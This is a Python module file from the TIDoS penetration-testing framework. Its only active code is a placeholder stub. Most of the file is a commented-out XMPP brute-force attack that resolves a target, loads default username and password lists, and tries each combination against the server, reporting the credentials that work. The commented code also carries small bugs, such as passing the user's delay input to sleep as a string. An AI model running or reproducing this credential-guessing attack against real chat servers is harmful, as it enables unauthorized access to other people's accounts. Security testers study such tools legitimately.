#!/usr/bin/env python
from core.colors import color
def xmppbrute(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# # -*- coding: utf-8 -*-

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #Author: @_tID
# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function
# import os
# import sys
# import time
# import socket
# from time import sleep
# from xmpp import Client
# from core.Core.colors import *

# xmppuser = []
# xmpppass = []

# def xmppBrute0x00(ip, usernames, passwords, port, delay):
#     client = Client(str(ip))
#     client.connect(server=(str(ip), port))
#     for username in usernames:
#         for password in passwords:
#             try:
#                 if client.auth(username, password):
#                     client.sendInitPresence()
#                     print(G + ' [+] Username: %s | Password found: %s\n' % (username, password))
#                     client.disconnect()
#             except Exception as e:
#                 print(R+" [-] Error caught! Name: "+str(e))
#             except KeyboardInterrupt:
#                 client.disconnect()
#                 sys.exit(1)
#             except:
#                 print(GR+ " [*] Checking : "+C+"Username: %s | "+B+"Password: %s "+R+"| Incorrect!\n" % (username, password))
#                 sleep(delay)

# def xmppbrute(web):

#     print(GR+' [*] Loading module...\n')
#     time.sleep(0.6)
#     print(R+'    =====================')
#     print(R+'     X M P P   B R U T E ')
#     print(R+'    =====================\n')
#     with open('files/brute-db/xmpp/xmpp_defuser.lst') as users:
#         for user in users:
#             user = user.strip('\n')
#             xmppuser.append(user)
#     with open('files/brute-db/xmpp/xmpp_defpass.lst') as passwd:
#         for passw in passwd:
#             passw = passw.strip('\n')
#             xmpppass.append(passw)

#     web = web.replace('https://','')
#     web = web.replace('http://','')
#     ip = socket.gethostbyname(web)
#     w = raw_input(O+' [#] Use IP '+R+ip+' ? (y/n) :> ')
#     if w == 'y' or w == 'Y':
#         port = raw_input(O+' [#] Enter the port (eg. 5222) :> ')
#         delay = raw_input(C+' [#] Delay between each request (eg. 0.2) :> ')
#         print(B+' [*] Initiating module...')
#         time.sleep(1)
#         print(GR+' [*] Trying using default credentials...')
#         xmppBrute0x00(ip, xmppuser, xmpppass, port, delay)
#     elif w == 'n' or w == 'N':
#         ip = raw_input(O+' [#] Enter IP :> ')
#         port = raw_input(O+' [#] Enter the port (eg. 5222) :> ')
#         delay = raw_input(C+' [#] Delay between each request (eg. 0.2) :> ')
#         print(B+' [*] Initiating module...')
#         time.sleep(1)
#         print(GR+' [*] Trying using default credentials...')
#         xmppBrute0x00(ip, xmppuser, xmpppass, port, delay)
#     else:
#         print(R+' [-] Sorry fam you typed shit!')
#         sleep(0.7)
#     print(G+' [+] Done!')
